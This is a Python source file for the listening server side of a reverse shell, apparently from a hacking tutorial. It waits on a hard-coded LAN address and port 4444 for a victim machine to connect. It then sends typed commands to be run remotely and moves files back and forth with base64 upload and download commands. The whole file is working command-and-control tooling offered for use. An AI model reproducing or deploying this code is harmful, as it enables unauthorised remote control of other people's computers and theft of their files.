import socket
import json
import base64


class Server:
    
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("<+> Waiting to connection........")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {address}")
    
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    


    def reliable_recv(self):
        json_data = ""

        while True:
            try:
                json_data += self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    
    def execute_remotely(self,command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
            
        
        return self.reliable_recv()
    

    def write_file(self, path, content):
        with open(path, "wb") as file:
            # file.write(content)
            
            file.write(base64.b64decode(content))  # Decode Base64 string to bytes
            return "<-> Downloaded successfully"
    
    def read_file(self, path):
        with open(path, 'rb') as file:
            # return file.read()
            return base64.b64encode(file.read()).decode('utf-8') # Encode to Base64
    
    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:

                if command[0] == "upload":
                    file_content = self.read_file(path=command[1])
                    command.append(file_content)

                result = self.execute_remotely(command=command)

                if command[0] == "download" and "<-!-> Error" not in result:
                    download_message = self.write_file(path=command[1],content=result)
                    print(download_message)
            except Exception as e:
                result = f"<-!-> Error during command execution: \n {e}"
            
            print(result)


my_server = Server("192.168.0.103",4444)

my_server.run()
